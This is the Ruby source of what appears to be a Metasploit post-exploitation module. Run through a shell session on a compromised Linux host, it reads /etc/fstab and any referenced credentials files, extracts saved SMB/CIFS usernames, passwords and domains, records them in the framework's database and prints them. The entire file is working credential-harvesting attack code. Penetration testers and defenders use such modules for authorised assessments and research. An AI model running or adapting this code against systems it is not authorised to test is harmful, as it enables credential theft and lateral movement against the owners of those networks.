require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/file'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Linux Gather credentials saved for mount.smbfs',
				'Description'   => %q{Post Module to obtain credentials saved for mount.smbfs in /etc/fstab on a Linux system},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Jon Hart <jhart@spoofed.org>'],
				'Platform'      => [ 'linux' ],
				'SessionTypes'  => [ 'shell' ]
			))
	end

	def run
		# keep track of any of the credentials files we read so we only read them once
		cred_files = []
		read_file("/etc/fstab").each_line do |fstab_line|
			fstab_line.strip!
			# if the fstab line utilizies the credentials= option, read the credentials from that file
			if (fstab_line =~ /\/\/([^\/]+)\/\S+\s+\S+\s+cifs\s+.*/)
				host = $1
				# IPs can occur using the ip option, which is a backup/alternative
				# to letting UNC resolution do its thing
				host = $1 if (fstab_line =~ /ip=([^, ]+)/)
				if (fstab_line =~ /cred(?:entials)?=([^, ]+)/)
					file = $1
					# skip if we've already parsed this credentials file
					next if (cred_files.include?(file))
					# store it if we haven't
					cred_files << file
					# parse the credentials
					auth = parse_credentials_file(file)
					# report
					report_cifscreds(host, auth, file)
				# if the credentials are directly in /etc/fstab, parse them
				elsif (fstab_line =~ /\/\/([^\/]+)\/\S+\s+\S+\s+cifs\s+.*(?:user(?:name)?|pass(?:word)?)=/)
					auth = parse_fstab_credentials(fstab_line)
					report_cifscreds(host, auth, "/etc/fstab")
				end
			end
		end
	end

	def parse_fstab_credentials(line)
		creds = {}
		# get the username option, which comes in one of four ways
		user_opt = $1 if (line =~ /user(?:name)?=([^, ]+)/)
		case user_opt
		# domain/user%pass
		when /^([^\/]+)\/([^%]+)%(.*)$/
			creds[:user] = "#{$1}\\#{$2}"
			creds[:pass] = $3
		# domain/user
		when /^([^\/]+)\/([^%]+)$/
			creds[:user] = "#{$1}\\#{$2}"
		# user%password
		when /^([^%]+)%(.*)$/
			creds[:user] = $1
			creds[:pass] = $2
		# user
		else
			creds[:user] = user_opt
		end if (user_opt)

		# get the password option if any
		creds[:pass] = $1 if (line =~ /pass(?:word)?=([^, ]+)/)

		# get the domain option, if any
		creds[:user] = "#{$1}\\#{creds[:user]}" if (line =~ /dom(?:ain)?=([^, ]+)/)

		creds
	end

	def parse_credentials_file(file)
		creds = {}
		domain = nil
		read_file(file).each_line do |credfile_line|
			case credfile_line
			when /domain=(.*)/
				domain = $1
			when /password=(.*)/
				creds[:pass] = $1
			when /username=(.*)/
				creds[:user] = $1
			end
		end
		# prepend the domain if one was found
		creds[:user] = "#{domain}\\#{creds[:user]}" if (domain and creds[:user])

		creds
	end

	# Report SMB auth info +auth+ for +host+ found in +file+
	def report_cifscreds(host, auth, file)
		# report if we found something
		if (auth[:user] or auth[:pass])
			auth = {
				:host => host,
				:port => 445,
				:sname => 'smb',
				:type => 'password',
				:active => true
			}.merge(auth)
			report_auth_info(auth)
			print_good("SMB credentials: user=#{auth[:user]}, pass=#{auth[:pass]}, host=#{auth[:host]} from #{file}")
		end
	end
end
